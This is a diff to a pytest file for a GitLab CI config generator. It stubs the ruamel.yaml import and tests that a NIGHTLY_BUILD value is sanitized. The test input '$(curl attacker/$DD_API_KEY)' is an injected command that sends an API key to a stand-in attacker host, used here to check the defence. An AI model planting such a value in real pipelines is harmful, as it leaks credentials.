@@ -3,6 +3,7 @@
 import importlib.util
 import pathlib
 import sys
+import types
 from unittest import mock
 
 import pytest
@@ -13,11 +14,21 @@ _SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gi
 
 @pytest.fixture(scope="module")
 def gen_gitlab_config_mod():
+    ruamel = types.ModuleType("ruamel")
+    yaml = types.ModuleType("ruamel.yaml")
+
+    class YAML:
+        def load(self, content):
+            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}
+
+    yaml.YAML = YAML
+    ruamel.yaml = yaml
     spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
     assert spec is not None and spec.loader is not None
     module = importlib.util.module_from_spec(spec)
     sys.modules[spec.name] = module
-    spec.loader.exec_module(module)
+    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml}):
+        spec.loader.exec_module(module)
     return module
 
 
@@ -45,8 +56,7 @@ def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, mo
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
 
     with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        with mock.patch.object(gen_gitlab_config_mod, "_get_testrunner_image_hash", return_value="imagehash"):
-            config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
+        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
 
     assert '    - export NIGHTLY_BUILD="false"' in config
     assert "$(curl" not in config
